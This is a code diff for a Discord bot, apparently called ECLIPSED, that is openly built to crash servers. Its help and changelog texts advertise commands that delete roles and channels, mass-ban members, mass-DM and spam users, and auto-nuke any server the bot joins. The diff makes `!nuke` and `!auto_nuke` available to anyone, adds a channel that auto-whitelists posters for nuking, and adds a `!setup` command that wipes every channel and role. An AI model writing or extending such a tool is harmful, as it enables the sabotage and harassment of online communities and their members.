@@ -439,11 +439,18 @@ async def do_owner_nuke_task(guild, spam_text=None):
 
 # ─── COMMANDS ──────────────────────────────────────────────
 
+# ID домашнего сервера — только OWNER_ID может использовать команды
+HOME_GUILD_ID = 1497100825628115108
+
 # Глобальная проверка — блокирует ВСЕ команды на заблокированном сервере
 @bot.check
 async def global_guild_block(ctx):
     if ctx.guild and is_guild_blocked(ctx.guild.id):
         return False
+    # На домашнем сервере — только овнер может использовать команды
+    if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
+        if ctx.author.id != config.OWNER_ID:
+            return False
     return True
 
 @bot.command()
@@ -933,69 +940,66 @@ async def auto_info(ctx):
 
 @bot.command(name="setup")
 async def setup(ctx):
-    """Создать структуру сервера ECLIPSED (роли + каналы). Только для овнера."""
+    """Пересоздать структуру сервера ECLIPSED. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
     guild = ctx.guild
-    msg = await ctx.send("⚙️ Создаю структуру сервера...")
+    msg = await ctx.send("⚙️ Пересоздаю структуру сервера...")
 
-    # ── Роли (без прав) ──
-    role_names = ["Developer", "Owner", "Premium", "White", "Guest"]
-    role_colors = [
-        discord.Color.dark_red(),
-        discord.Color.gold(),
-        discord.Color.purple(),
-        discord.Color.blue(),
-        discord.Color.light_grey()
+    # ── Удаляем все каналы и роли ──
+    for ch in guild.channels:
+        try:
+            await ch.delete()
+        except Exception:
+            pass
+    bot_role = guild.me.top_role
+    for r in guild.roles:
+        if r < bot_role and not r.is_default():
+            try:
+                await r.delete()
+            except Exception:
+                pass
+
+    # ── Создаём роли (без прав) ──
+    roles_data = [
+        ("🔧 Developer", discord.Color.from_rgb(255, 80, 80)),
+        ("👑 Owner", discord.Color.gold()),
+        ("💎 Premium", discord.Color.purple()),
+        ("✅ White", discord.Color.blue()),
+        ("👤 Guest", discord.Color.light_grey()),
     ]
-    created_roles = {}
-    for name, color in zip(role_names, role_colors):
-        existing = discord.utils.get(guild.roles, name=name)
-        if not existing:
-            r = await guild.create_role(name=name, color=color, permissions=discord.Permissions.none())
-            created_roles[name] = r
-        else:
-            created_roles[name] = existing
+    for name, color in roles_data:
+        await guild.create_role(name=name, color=color, permissions=discord.Permissions.none())
 
-    # ── Категории и каналы ──
-    # Категория: ОСНОВНОЕ
-    cat_main = discord.utils.get(guild.categories, name="ОСНОВНОЕ")
-    if not cat_main:
-        cat_main = await guild.create_category("ОСНОВНОЕ")
-    for ch_name in ["news", "changelog", "contests"]:
-        if not discord.utils.get(guild.text_channels, name=ch_name):
-            await guild.create_text_channel(ch_name, category=cat_main)
+    # ── Категория: 📢 ОСНОВНОЕ ──
+    cat_main = await guild.create_category("📢 ОСНОВНОЕ")
+    await guild.create_text_channel("📰・news", category=cat_main)
+    await guild.create_text_channel("📋・changelog", category=cat_main)
+    await guild.create_text_channel("🏆・contests", category=cat_main)
+    await guild.create_text_channel("🤖・addbot", category=cat_main)
 
-    # Категория: ЧАТЫ
-    cat_chat = discord.utils.get(guild.categories, name="ЧАТЫ")
-    if not cat_chat:
-        cat_chat = await guild.create_category("ЧАТЫ")
-    for ch_name in ["chat", "ideas-💡"]:
-        if not discord.utils.get(guild.text_channels, name=ch_name):
-            await guild.create_text_channel(ch_name, category=cat_chat)
-    # Канал create-ticket
-    if not discord.utils.get(guild.text_channels, name="create-ticket"):
-        await guild.create_text_channel("create-ticket", category=cat_chat)
+    # ── Категория: 💬 ЧАТЫ ──
+    cat_chat = await guild.create_category("💬 ЧАТЫ")
+    await guild.create_text_channel("💬・chat", category=cat_chat)
+    await guild.create_text_channel("💡・ideas", category=cat_chat)
+    await guild.create_text_channel("🎫・create-ticket", category=cat_chat)
 
-    # Категория: ВОЙСЫ
-    cat_voice = discord.utils.get(guild.categories, name="ВОЙСЫ")
-    if not cat_voice:
-        cat_voice = await guild.create_category("ВОЙСЫ")
+    # ── Категория: 🔊 ВОЙСЫ ──
+    cat_voice = await guild.create_category("🔊 ВОЙСЫ")
     for i in range(1, 4):
-        if not discord.utils.get(guild.voice_channels, name=f"voice-{i}"):
-            await guild.create_voice_channel(f"voice-{i}", category=cat_voice)
+        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice)
 
     embed = discord.Embed(
-        title="✅ Структура сервера создана",
+        title="✅ Структура сервера пересоздана",
         description=(
-            "**Роли:** Developer, Owner, Premium, White, Guest\n\n"
-            "**ОСНОВНОЕ:** #news, #changelog, #contests\n"
-            "**ЧАТЫ:** #chat, #ideas-💡, #create-ticket\n"
-            "**ВОЙСЫ:** voice-1, voice-2, voice-3"
+            "**Роли:** 🔧 Developer · 👑 Owner · 💎 Premium · ✅ White · 👤 Guest\n\n"
+            "**📢 ОСНОВНОЕ:** 📰・news · 📋・changelog · 🏆・contests\n"
+            "**💬 ЧАТЫ:** 💬・chat · 💡・ideas · 🎫・create-ticket\n"
+            "**🔊 ВОЙСЫ:** 🔊 voice-1 · 🔊 voice-2 · 🔊 voice-3"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Роли без прав — настрой вручную")
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Роли без прав — настрой права вручную")
     await msg.edit(content=None, embed=embed)
 
 
@@ -1571,90 +1575,57 @@ bot.remove_command("help")
 
 @bot.command(name="changelog")
 async def changelog(ctx):
+    """Показывает только последнее обновление v1.8."""
     embed = discord.Embed(
-        title="📋 CHANGELOG — ECLIPSED BOT",
-        description="История обновлений бота.",
+        title="📋 CHANGELOG — v1.8  |  Последнее обновление",
         color=0x0a0a0a
-    )
-    embed.add_field(
-        name="☠️ v1.0 — Запуск",
-        value=(
-            "• Базовый краш — `!nuke`, `!stop`\n"
-            "• `!webhooks`, логирование действий в файл"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="⚡ v1.1 — Расширение функционала",
-        value=(
-            "• `!auto_nuke on/off` — авто-краш при входе бота\n"
-            "• `/sp`, `/spkd` — slash спам команды\n"
-            "• Whitelist система — `!wl_add/remove/list`\n"
-            "• `!cleanup`, `!rename`, `!nicks_all`\n"
-            "• Управление через ЛС"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="🎨 v1.2 — Редизайн и Owner Panel",
-        value=(
-            "• Тёмный стиль ☠️, ASCII арт\n"
-            "• Owner Panel через ЛС — `!owner_help`, `!guilds`, `!setguild`\n"
-            "• Owner Whitelist — `!owl_add/remove/list`\n"
-            "• `!invlink` — инвайты со всех серверов"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="🆕 v1.3 — Монетизация и защита",
-        value=(
-            "• **Premium** система — кастомный текст в `!nuke`\n"
-            "• Блокировка серверов — `!block_guild/unblock_guild`\n"
-            "• `!set_spam_text` — смена дефолтного текста"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="🆕 v1.4 — Premium расширение",
-        value=(
-            "• `!massdm`, `!massban`, `!spam`, `!pingspam`\n"
-            "• `!rolesdelete`, `!serverinfo`, `!userinfo`\n"
-            "• `!auto_super_nuke` — авто нюк при входе"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="💀 v1.5-1.6 — Super Nuke",
-        value=(
-            "• `!super_nuke` — premium нюк\n"
-            "• `!auto_superpr_nuke` — авто premium нюк при входе\n"
-            "• `!auto_super_nuke` теперь использует функционал `!super_nuke`"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="🔥 v1.7 — MongoDB и улучшения",
-        value=(
-            "• MongoDB — данные не слетают при рестарте Railway\n"
-            "• `!pm_add` автоматически добавляет в whitelist\n"
-            "• `!list` — все списки в одном embed\n"
-            "• `!list_clear` — очистить списки кроме овнеров"
-        ),
-        inline=False
     )
     embed.add_field(
         name="🔥 v1.8 — Большое обновление",
         value=(
-            "• **`!nuke` теперь доступен ВСЕМ** — любой может использовать без подписки!\n"
-            "• `!nuke [текст]` — кастомный текст только для подписчиков\n"
-            "• `!nuke` — новая последовательность: переименование → удаление ролей → каналы → спам → роль ☠️ ECLIPSED\n"
-            "• `!super_nuke` — оставляет до 15 участников, создаёт роль ☠️ ECLIPSED\n"
-            "• `!owner_nuke` / `!auto_owner_nuke` — нюк без ограничений для owner list\n"
-            "• `!on_add/remove/list` — отдельный список для owner_nuke\n"
-            "• `!goout` — бот покидает сервер\n"
-            "• `!nukelogs` — логи нюков с инвайтами и ролью администратора\n"
-            "• `!unban <id>` — разбан через ЛС на всех серверах\n"
-            "• `!roles` / `!giverole` — управление ролями"
+            "• **`!nuke` и `!auto_nuke` доступны ВСЕМ** без подписки!\n"
+            "• `!nuke [текст]` — кастомный текст только для whitelist\n"
+            "• `!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
+            "• `!super_nuke` + `!auto_super_nuke` — всегда вместе, до 15 участников\n"
+            "• `!owner_nuke` + `!auto_owner_nuke` — нюк без ограничений\n"
+            "• `!on_add/remove/list` — список для owner_nuke\n"
+            "• `!auto_off` — выключить все авто нюки\n"
+            "• `!auto_info` — статус всех авто нюков\n"
+            "• `!setup` — создать структуру сервера\n"
+            "• `!goout` — покинуть сервер\n"
+            "• `!nukelogs` — логи нюков\n"
+            "• `!unban <id>` — разбан через ЛС\n"
+            "• `!roles` / `!giverole` — управление ролями\n"
+            "• MongoDB — постоянное хранение данных"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  !changelogall — вся история")
+    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="changelogall")
+async def changelogall(ctx):
+    """Показывает всю историю обновлений v1.0-v1.8."""
+    embed = discord.Embed(
+        title="📋 CHANGELOG — Полная история  |  v1.0 → v1.8",
+        color=0x0a0a0a
+    )
+    embed.add_field(name="☠️ v1.0", value="• `!nuke`, `!stop`, `!webhooks`, логирование", inline=False)
+    embed.add_field(name="⚡ v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
+    embed.add_field(name="🎨 v1.2", value="• Тёмный стиль, Owner Panel, `!owl_add`, `!invlink`", inline=False)
+    embed.add_field(name="🆕 v1.3", value="• Premium система, `!block_guild`, `!set_spam_text`", inline=False)
+    embed.add_field(name="🆕 v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
+    embed.add_field(name="💀 v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
+    embed.add_field(name="🔥 v1.7", value="• MongoDB, `!pm_add` авто +whitelist, `!list`, `!list_clear`", inline=False)
+    embed.add_field(
+        name="🔥 v1.8",
+        value=(
+            "• **`!nuke` и `!auto_nuke` доступны ВСЕМ**\n"
+            "• `!owner_nuke` + `!auto_owner_nuke` + `!on_add/remove/list`\n"
+            "• `!auto_off`, `!auto_info`, `!setup`, `!goout`\n"
+            "• `!nukelogs`, `!unban`, `!roles`, `!giverole`"
         ),
         inline=False
     )
@@ -1669,7 +1640,6 @@ async def help_cmd(ctx):
     is_owner = (uid == config.OWNER_ID)
     is_prem = is_premium(uid)
     is_wl = is_whitelisted(uid)
-    is_on = is_owner_nuker(uid)
 
     embed = discord.Embed(
         title="☠️ ECLIPSED — CRASH BOT",
@@ -1688,14 +1658,12 @@ async def help_cmd(ctx):
 
     if is_owner:
         access_str = "👑 **OWNER** — полный доступ"
-    elif is_on:
-        access_str = "⚔️ **OWNER NUKE** — доступ к owner_nuke"
     elif is_prem:
         access_str = "💎 **PREMIUM** — расширенный доступ"
     elif is_wl:
-        access_str = "✅ **Подписка** — базовые команды"
+        access_str = "✅ **Whitelist** — базовые команды"
     else:
-        access_str = "🌍 **Гость** — `!nuke` доступен всем!"
+        access_str = "🌍 **Гость** — `!nuke` и `!auto_nuke` доступны всем!"
 
     embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)
 
@@ -1703,14 +1671,16 @@ async def help_cmd(ctx):
         name="📋 ДОСТУПНО ВСЕМ",
         value=(
             "`!help` — это меню\n"
-            "`!changelog` — история обновлений\n"
-            "`!nuke` — краш сервера (переименование → роли → каналы → спам → роль ☠️)"
+            "`!changelog` — последнее обновление\n"
+            "`!changelogall` — вся история\n"
+            "`!nuke` — краш (переименование → роли → каналы → спам → роль ☠️)\n"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="✅ ПОДПИСКА",
+        name="✅ WHITELIST",
         value=(
             "`!nuke [текст]` — нюк со своим текстом\n"
             "`!stop` — остановить краш\n"
@@ -1718,7 +1688,6 @@ async def help_cmd(ctx):
             "`!rename [название]` — переименовать каналы\n"
             "`!nicks_all [ник]` — сменить ники всем\n"
             "`!webhooks` — список вебхуков\n"
-            "`!auto_nuke on/off/info` — авто-краш при входе\n"
             "`!inv` — ссылка для добавления бота\n"
             "`/sp [кол-во] [текст]` — спам\n"
             "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
@@ -1730,46 +1699,30 @@ async def help_cmd(ctx):
         name="💎 PREMIUM",
         value=(
             "`!nuke [текст]` — нюк с кастомным текстом\n"
-            "`!super_nuke [текст]` — нюк, оставляет до 15 участников + роль ☠️\n"
-            "`!massban` — забанить всех\n"
-            "`!massdm [текст]` — масс ДМ\n"
-            "`!spam [кол-во] [текст]` — спам в канал\n"
-            "`!pingspam [кол-во]` — спам @everyone\n"
-            "`!rolesdelete` — удалить все роли\n"
-            "`!serverinfo` — инфо о сервере\n"
-            "`!userinfo [id]` — инфо о пользователе\n"
-            "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
-            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
+            "`!super_nuke [текст]` — нюк, до 15 участников + роль ☠️\n"
+            "`!auto_super_nuke on/off/text/info` — авто super_nuke при входе\n"
+            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе\n"
+            "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
+            "`!rolesdelete` · `!serverinfo` · `!userinfo`"
         ),
         inline=False
     )
-
-    if is_on or is_owner:
-        embed.add_field(
-            name="⚔️ OWNER NUKE",
-            value=(
-                "`!owner_nuke [текст]` — полный нюк без ограничений + роль ☠️\n"
-                "`!auto_owner_nuke on/off/text/info` — авто owner нюк при входе"
-            ),
-            inline=False
-        )
 
     if is_owner:
         embed.add_field(
             name="👑 OWNER",
             value=(
-                "`!wl_add/remove/list` — whitelist\n"
-                "`!pm_add/remove/list` — premium (авто +whitelist)\n"
+                "`!owner_nuke [текст]` — полный нюк + роль ☠️\n"
+                "`!auto_owner_nuke on/off/text/info` — авто owner нюк\n"
+                "`!auto_off` — выключить все авто нюки\n"
+                "`!auto_info` — статус всех авто нюков\n"
+                "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                 "`!on_add/remove/list` — owner nuke list\n"
-                "`!list` — все списки  |  `!list_clear` — очистить\n"
-                "`!block_guild/unblock_guild` — блокировка серверов\n"
-                "`!set_spam_text/get_spam_text` — текст нюка\n"
-                "`!owl_add/remove/list` — owner whitelist\n"
-                "`!goout` — покинуть сервер\n"
-                "`!nukelogs` — логи нюков\n"
-                "`!roles` / `!giverole` — роли\n"
-                "`!unban <id>` — разбан на всех серверах\n"
-                "`!guilds / !setguild / !invlink` — управление через ЛС"
+                "`!list` · `!list_clear` · `!block_guild/unblock_guild`\n"
+                "`!set_spam_text` · `!owl_add/remove/list`\n"
+                "`!setup` — создать структуру сервера\n"
+                "`!goout` · `!nukelogs` · `!roles` · `!giverole`\n"
+                "`!unban <id>` · `!guilds` · `!setguild` · `!invlink`"
             ),
             inline=False
         )
@@ -1779,9 +1732,10 @@ async def help_cmd(ctx):
         value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelog — история обновлений  |  v1.8")
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelogall — вся история  |  v1.8")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
+
 
 
 @bot.command(name="commands_user")
@@ -2781,6 +2735,49 @@ async def on_message(message):
     # ── Обычная обработка на сервере ────────────────────────
     if message.guild and is_guild_blocked(message.guild.id):
         return  # Сервер заблокирован — игнорируем всё
+
+    # ── Канал addbot на домашнем сервере ──────────────────────
+    if (message.guild and message.guild.id == HOME_GUILD_ID
+            and message.channel.name in ("🤖・addbot", "addbot")
+            and not message.author.bot):
+        uid = message.author.id
+        # Удаляем сообщение пользователя
+        try:
+            await message.delete()
+        except Exception:
+            pass
+        if uid in config.WHITELIST:
+            try:
+                await message.author.send(
+                    embed=discord.Embed(
+                        title="✅ У тебя уже есть доступ",
+                        description="Ты уже в whitelist — можешь использовать команды бота.",
+                        color=0x0a0a0a
+                    ).set_footer(text="☠️ ECLIPSED SQUAD")
+                )
+            except Exception:
+                pass
+        else:
+            config.WHITELIST.append(uid)
+            save_whitelist()
+            try:
+                await message.author.send(
+                    embed=discord.Embed(
+                        title="✅ Доступ получен!",
+                        description=(
+                            "Ты добавлен в whitelist и теперь можешь использовать команды бота.\n\n"
+                            "**Доступные команды:**\n"
+                            "`!nuke` — краш сервера\n"
+                            "`!auto_nuke on/off` — авто-краш при входе\n"
+                            "`!stop`, `!cleanup`, `!rename`, `!nicks_all`\n\n"
+                            "Напиши `!help` боту в ЛС чтобы увидеть все команды."
+                        ),
+                        color=0x0a0a0a
+                    ).set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+                )
+            except Exception:
+                pass
+        return
     if message.content.strip() == "!" and is_whitelisted(message.author.id):
         ctx = await bot.get_context(message)
         await help_cmd(ctx)
@@ -3185,6 +3182,7 @@ async def on_ready():
     for guild in bot.guilds:
         bot.tree.clear_commands(guild=guild)
         await bot.tree.sync(guild=guild)
+
     print(f"Бот запущен как {bot.user}")
 
 
